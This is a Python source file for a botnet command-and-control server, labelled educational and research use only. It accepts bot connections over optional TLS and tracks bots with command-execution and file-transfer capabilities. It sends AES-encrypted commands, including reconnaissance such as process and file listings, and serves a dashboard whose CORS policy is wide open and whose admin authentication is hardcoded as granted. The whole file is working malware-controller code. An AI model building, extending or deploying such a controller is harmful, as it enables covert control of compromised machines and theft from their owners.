#!/usr/bin/env python3
"""

Enhanced Botnet Command & Control Server (Educational/Research Use Only)

This is an improved version of the botnet controller that demonstrates:
- Secure AES-only encryption (XOR removed for security)
- Async architecture for better performance
- Comprehensive event logging with security considerations
- Structured JSON protocol with validation
- Resource management and monitoring
- Input validation and sanitization

Author: Enhanced Implementation
License: Educational/Research Use Only

"""

import asyncio
import json
import datetime
import signal
import sys
from typing import Optional, Dict, Any, List
from pathlib import Path
from aiohttp import web
import aiohttp_cors

# Import our enhanced utilities
from utils import (
    SecureConfig,
    SecureEncryption,
    InputValidator,
    SecureLogger,
    BotTracker,
    TLSHelper,
    generate_bot_id,
    create_command_payload,
)


class EnhancedBotnetServer:
    """
    Enhanced botnet server with modern security and performance features.
    """

    def __init__(self, config_file: Optional[str] = None):
        """
        Initialize the enhanced botnet server.

        Args:
            config_file: Optional path to configuration file
        """
        self.config = SecureConfig(config_file)
        self.logger = SecureLogger(
            "EnhancedBotnetServer", self.config.get("LOG_LEVEL", "INFO")
        )
        self.encryption = SecureEncryption(self.config.get_encryption_key())
        self.validator = InputValidator()
        self.bot_tracker = BotTracker()

        self.host = self.config.get("SERVER_HOST", "127.0.0.1")
        self.port = self.config.get("SERVER_PORT", 9999)
        self.web_port = self.config.get("WEB_PORT", 8080)
        self.max_connections = self.config.get("MAX_CONNECTIONS", 100)

        self.server: Optional[asyncio.Server] = None
        self.web_app: Optional[web.Application] = None
        self.web_runner: Optional[web.AppRunner] = None
        self.active_connections: Dict[str, asyncio.StreamWriter] = {}
        self.command_history: List[Dict[str, Any]] = []
        self.shutdown_event = asyncio.Event()

        # Performance monitoring
        self.stats = {
            "start_time": datetime.datetime.now(),
            "total_connections": 0,
            "commands_processed": 0,
            "bytes_sent": 0,
            "bytes_received": 0,
        }

        self.ssl_context = TLSHelper.create_ssl_context(
            self.config.get("TLS_CERT_PATH"), self.config.get("TLS_KEY_PATH")
        )

        self.logger.info("Enhanced Botnet Server initialized")

    async def setup_web_server(self) -> None:
        """Setup the web dashboard server."""
        self.web_app = web.Application()

        # Setup CORS
        cors = aiohttp_cors.setup(self.web_app, defaults={
            "*": aiohttp_cors.ResourceOptions(
                allow_credentials=True,
                expose_headers="*",
                allow_headers="*",
                allow_methods="*"
            )
        })

        # Add routes
        self.web_app.router.add_get('/', self.serve_dashboard)
        self.web_app.router.add_get('/dashboard', self.serve_dashboard)
        self.web_app.router.add_get('/api/status', self.api_status)
        self.web_app.router.add_get('/api/bots', self.api_bots)
        self.web_app.router.add_get('/api/stats', self.api_stats)

        # Add CORS to all routes
        for route in list(self.web_app.router.routes()):
            cors.add(route)

    async def serve_dashboard(self, request: web.Request) -> web.Response:
        """Serve the cyberpunk dashboard HTML."""
        try:
            dashboard_path = Path(__file__).parent / "dashboard.html"
            if dashboard_path.exists():
                with open(dashboard_path, 'r', encoding='utf-8') as f:
                    content = f.read()
                return web.Response(text=content, content_type='text/html')
            else:
                return web.Response(text="Dashboard not found", status=404)
        except Exception as e:
            self.logger.error(f"Error serving dashboard: {str(e)}")
            return web.Response(text="Error loading dashboard", status=500)

    async def api_status(self, request: web.Request) -> web.Response:
        """API endpoint for server status."""
        try:
            active_bots = self.bot_tracker.get_active_bots()
            status_data = {
                "server_running": True,
                "active_bots": len(active_bots),
                "total_connections": self.stats["total_connections"],
                "commands_processed": self.stats["commands_processed"],
                "bytes_sent": self.stats["bytes_sent"],
                "bytes_received": self.stats["bytes_received"],
                "uptime_seconds": (
                    datetime.datetime.now() - self.stats["start_time"]
                ).total_seconds(),
                "tls_enabled": self.ssl_context is not None,
                "admin_authenticated": True,  # Assume authenticated for demo
                "bots": active_bots,
                "command_history": self.command_history[-20:],  # Last 20 commands
                "server_version": "2.0 Enhanced",
                "encryption_enabled": True
            }

            return web.json_response(status_data)
        except Exception as e:
            self.logger.error(f"Error in status API: {str(e)}")
            return web.json_response({"error": "Internal server error"}, status=500)

    async def api_bots(self, request: web.Request) -> web.Response:
        """API endpoint for bot information."""
        try:
            active_bots = self.bot_tracker.get_active_bots()
            return web.json_response({"bots": active_bots})
        except Exception as e:
            self.logger.error(f"Error in bots API: {str(e)}")
            return web.json_response({"error": "Internal server error"}, status=500)

    async def api_stats(self, request: web.Request) -> web.Response:
        """API endpoint for detailed statistics."""
        try:
            stats_data = self.get_server_stats()
            return web.json_response(stats_data)
        except Exception as e:
            self.logger.error(f"Error in stats API: {str(e)}")
            return web.json_response({"error": "Internal server error"}, status=500)

    async def handle_client_connection(
        self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter
    ) -> None:
        """
        Handle individual bot connection with enhanced security and monitoring.

        Args:
            reader: Async stream reader
            writer: Async stream writer
        """
        client_addr = writer.get_extra_info("peername")
        if not client_addr:
            await self._close_connection(None, writer)
            return

        ip_address = client_addr[0]

        # Validate IP and connection limits
        if not self._validate_connection(ip_address):
            await self._close_connection(None, writer)
            return

        bot_id = generate_bot_id(ip_address, str(datetime.datetime.now().timestamp()))
        self.active_connections[bot_id] = writer
        self.stats["total_connections"] += 1

        try:
            # Send enhanced welcome message
            welcome_data = {
                "status": "connected",
                "server_version": "2.0",
                "bot_id": bot_id,
                "timestamp": datetime.datetime.now().isoformat(),
                "features": ["secure_encryption", "async_io", "monitoring"],
            }
            await self._send_secure_message(writer, welcome_data)

            # Register bot with enhanced metadata
            await self.bot_tracker.add_bot(
                bot_id,
                ip_address,
                {
                    "connection_time": datetime.datetime.now().isoformat(),
                    "protocol_version": "2.0",
                    "capabilities": [
                        "command_execution",
                        "file_transfer",
                        "monitoring",
                    ],
                },
            )

            self.logger.info(f"Enhanced bot connected: {bot_id} from {ip_address}")

            # Start command processing for this bot
            await self._process_bot_commands(bot_id, reader, writer)

        except asyncio.CancelledError:
            self.logger.info(f"Connection cancelled for bot {bot_id}")
        except Exception as e:
            self.logger.error(f"Error handling bot {bot_id}: {str(e)}")
        finally:
            await self._cleanup_bot_connection(bot_id, writer)

    def _validate_connection(self, ip_address: str) -> bool:
        """
        Validate incoming connection.

        Args:
            ip_address: Client IP address

        Returns:
            True if connection should be accepted
        """
        # Validate IP format
        if not self.validator.validate_ip_address(ip_address):
            self.logger.warning(f"Invalid IP address format: {ip_address}")
            return False

        # Check connection limit
        if len(self.active_connections) >= self.max_connections:
            self.logger.warning(f"Connection limit reached. Rejecting {ip_address}")
            return False

        # Additional security checks could be added here:
        # - IP blacklisting
        # - Rate limiting
        # - Geographic restrictions

        return True

    async def _send_secure_message(
        self, writer: asyncio.StreamWriter, data: Dict[str, Any]
    ) -> None:
        """
        Send encrypted message to client.

        Args:
            writer: Stream writer
            data: Data to send
        """
        try:
            json_data = json.dumps(data)
            encrypted_data = self.encryption.encrypt(json_data)

            # Send length prefix followed by encrypted data
            message_length = len(encrypted_data)
            length_bytes = message_length.to_bytes(4, byteorder="big")

            writer.write(length_bytes + encrypted_data)
            await writer.drain()

            self.stats["bytes_sent"] += len(length_bytes) + len(encrypted_data)

        except Exception as e:
            self.logger.error(f"Failed to send secure message: {str(e)}")
            raise

    async def _receive_secure_message(
        self, reader: asyncio.StreamReader
    ) -> Optional[Dict[str, Any]]:
        """
        Receive and decrypt message from client.

        Args:
            reader: Stream reader

        Returns:
            Decrypted message data or None if invalid
        """
        try:
            # Read message length
            length_bytes = await reader.read(4)
            if len(length_bytes) != 4:
                return None

            message_length = int.from_bytes(length_bytes, byteorder="big")

            # Validate message length
            max_size = self.config.max_message_size
            if message_length <= 0 or message_length > max_size:
                self.logger.warning(
                    f"Invalid message length: {message_length} (limit: {max_size})"
                )
                return None

            # Read encrypted data
            encrypted_data = await reader.read(message_length)
            if len(encrypted_data) != message_length:
                return None

            # Decrypt and parse
            decrypted_data = self.encryption.decrypt(encrypted_data)
            json_data = json.loads(decrypted_data.decode("utf-8"))

            self.stats["bytes_received"] += len(length_bytes) + len(encrypted_data)

            # Validate JSON structure
            return self.validator.validate_json_payload(json.dumps(json_data))

        except Exception as e:
            self.logger.error(f"Failed to receive secure message: {str(e)}")
            return None

    async def _process_bot_commands(
        self, bot_id: str, reader: asyncio.StreamReader, writer: asyncio.StreamWriter
    ) -> None:
        """
        Process commands for a specific bot.

        Args:
            bot_id: Bot identifier
            reader: Stream reader
            writer: Stream writer
        """
        command_queue = asyncio.Queue()

        # Start command generation task (simulated for demo)
        command_task = asyncio.create_task(
            self._generate_commands(bot_id, command_queue)
        )

        try:
            while not self.shutdown_event.is_set():
                try:
                    # Wait for command or timeout for heartbeat
                    command = await asyncio.wait_for(command_queue.get(), timeout=30.0)

                    if command is None:  # Shutdown signal
                        break

                    # Send command to bot
                    command_data = create_command_payload(command, self.encryption)
                    await self._send_secure_message(writer, command_data)

                    # Wait for response
                    response = await asyncio.wait_for(
                        self._receive_secure_message(reader), timeout=10.0
                    )

                    if response:
                        await self._process_bot_response(bot_id, command, response)

                    # Update bot activity
                    await self.bot_tracker.update_bot_activity(
                        bot_id, "command_completed"
                    )
                    self.stats["commands_processed"] += 1

                except asyncio.TimeoutError:
                    # Send heartbeat
                    heartbeat_data = {
                        "type": "heartbeat",
                        "timestamp": datetime.datetime.now().timestamp(),
                    }
                    await self._send_secure_message(writer, heartbeat_data)
                    await self.bot_tracker.update_bot_activity(bot_id, "ping")

                except Exception as e:
                    self.logger.error(
                        f"Error processing command for bot {bot_id}: {str(e)}"
                    )
                    break

        finally:
            command_task.cancel()

    async def _generate_commands(
        self, bot_id: str, command_queue: asyncio.Queue
    ) -> None:
        """
        Generate commands for bot (demo implementation).

        Args:
            bot_id: Bot identifier
            command_queue: Queue to put commands
        """
        try:
            # Demo command sequence
            demo_commands = [
                "!status",
                "!system_info",
                "!network_config",
                "!process_list",
                "!file_listing /tmp",
            ]

            for command in demo_commands:
                if self.shutdown_event.is_set():
                    break

                await command_queue.put(command)
                await asyncio.sleep(5)  # Wait between commands

            # In a real implementation, commands would come from:
            # - Admin interface
            # - Database queue
            # - Message broker
            # - API endpoints

        except asyncio.CancelledError:
            pass

    async def _process_bot_response(
        self, bot_id: str, command: str, response: Dict[str, Any]
    ) -> None:
        """
        Process response from bot.

        Args:
            bot_id: Bot identifier
            command: Original command
            response: Bot response
        """
        # Log command execution (sanitized)
        command_record = {
            "bot_id": bot_id,
            "command": self.validator.sanitize_command(command)[
                :100
            ],  # Truncate for security
            "timestamp": datetime.datetime.now().isoformat(),
            "status": response.get("status", "unknown"),
            "response_size": len(str(response)),
        }

        self.command_history.append(command_record)

        # Keep only recent history
        if len(self.command_history) > 1000:
            self.command_history = self.command_history[-1000:]

        self.logger.info(f"Command completed for bot {bot_id}: {command[:50]}...")

    async def _cleanup_bot_connection(
        self, bot_id: str, writer: asyncio.StreamWriter
    ) -> None:
        """
        Clean up bot connection.

        Args:
            bot_id: Bot identifier
            writer: Stream writer
        """
        await self.bot_tracker.remove_bot(bot_id)
        self.active_connections.pop(bot_id, None)
        await self._close_connection(bot_id, writer)
        self.logger.info(f"Bot connection cleaned up: {bot_id}")

    async def _close_connection(
        self, bot_id: Optional[str], writer: asyncio.StreamWriter
    ) -> None:
        """
        Safely close connection.

        Args:
            bot_id: Bot identifier (optional)
            writer: Stream writer
        """
        try:
            if not writer.is_closing():
                writer.close()
                await writer.wait_closed()
        except Exception as e:
            self.logger.debug(f"Error closing connection for bot {bot_id}: {str(e)}")

    async def start_server(self) -> None:
        """Start the enhanced botnet server."""
        # Validate configuration
        if not self.validator.validate_port(self.port):
            self.logger.error(f"Invalid port number: {self.port}")
            return

        # Setup signal handlers
        if sys.platform != "win32":
            loop = asyncio.get_running_loop()
            for sig in (signal.SIGTERM, signal.SIGINT):
                loop.add_signal_handler(
                    sig, lambda: asyncio.create_task(self.shutdown())
                )

        try:
            # Setup web server first
            await self.setup_web_server()

            # Start web server
            self.web_runner = web.AppRunner(self.web_app)
            await self.web_runner.setup()
            web_site = web.TCPSite(self.web_runner, self.host, self.web_port)
            await web_site.start()
            self.logger.info(
                f"Web dashboard available at http://{self.host}:{self.web_port}"
            )

            # Start main server
            if self.ssl_context:
                self.server = await asyncio.start_server(
                    self.handle_client_connection,
                    self.host,
                    self.port,
                    ssl=self.ssl_context,
                )
                self.logger.info(
                    f"Enhanced secure server listening on {self.host}:{self.port} "
                    "(TLS enabled)"
                )
            else:
                self.server = await asyncio.start_server(
                    self.handle_client_connection, self.host, self.port
                )
                self.logger.info(
                    f"Enhanced server listening on {self.host}:{self.port} "
                    "(TLS disabled)"
                )

            # Start monitoring tasks
            monitor_task = asyncio.create_task(self._monitor_server())

            # Serve until shutdown
            async with self.server:
                await self.shutdown_event.wait()

        except Exception as e:
            self.logger.error(f"Failed to start enhanced server: {str(e)}")
        finally:
            if "monitor_task" in locals():
                monitor_task.cancel()
            await self._shutdown_server()

    async def _monitor_server(self) -> None:
        """Monitor server performance and status."""
        try:
            while not self.shutdown_event.is_set():
                await asyncio.sleep(60)  # Monitor every minute

                active_bots = self.bot_tracker.get_active_bots()
                uptime = datetime.datetime.now() - self.stats["start_time"]

                self.logger.info(
                    f"Server Status: {len(active_bots)} bots, "
                    f"{self.stats['commands_processed']} commands processed, "
                    f"uptime {uptime}"
                )

                # Performance statistics
                self.logger.debug(
                    f"Performance: {self.stats['bytes_sent']} bytes sent, "
                    f"{self.stats['bytes_received']} bytes received"
                )

        except asyncio.CancelledError:
            pass

    async def shutdown(self) -> None:
        """Gracefully shutdown the server."""
        self.logger.info("Shutdown signal received...")
        self.shutdown_event.set()

    async def _shutdown_server(self) -> None:
        """Complete server shutdown process."""
        self.logger.info("Shutting down enhanced server...")

        # Close web server
        if self.web_runner:
            await self.web_runner.cleanup()

        # Close all bot connections
        for bot_id, writer in list(self.active_connections.items()):
            await self._close_connection(bot_id, writer)

        # Close server
        if self.server:
            self.server.close()
            await self.server.wait_closed()

        self.logger.info("Enhanced server shutdown complete")

    def get_server_stats(self) -> Dict[str, Any]:
        """
        Get comprehensive server statistics.

        Returns:
            Dictionary with server statistics
        """
        uptime = datetime.datetime.now() - self.stats["start_time"]
        active_bots = self.bot_tracker.get_active_bots()

        return {
            "uptime_seconds": uptime.total_seconds(),
            "active_bots": len(active_bots),
            "total_connections": self.stats["total_connections"],
            "commands_processed": self.stats["commands_processed"],
            "bytes_sent": self.stats["bytes_sent"],
            "bytes_received": self.stats["bytes_received"],
            "command_history_size": len(self.command_history),
            "server_version": "2.0",
            "encryption_enabled": True,
            "tls_enabled": self.ssl_context is not None,
        }


# Legacy compatibility (XOR removed for security)
def xor_encrypt(cmd: str) -> bytes:
    """
    DEPRECATED: XOR encryption removed for security reasons.
    This function now redirects to secure AES encryption.
    """
    import warnings

    warnings.warn(
        "XOR encryption is deprecated and insecure. Use SecureEncryption instead.",
        DeprecationWarning,
        stacklevel=2,
    )

    # Fallback to secure encryption
    encryption = SecureEncryption()
    return encryption.encrypt(cmd)


async def main():
    """Main entry point for the enhanced botnet server."""
    server = EnhancedBotnetServer()
    await server.start_server()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nEnhanced server shutdown completed.")
    except Exception as e:
        print(f"Fatal error in enhanced server: {e}")
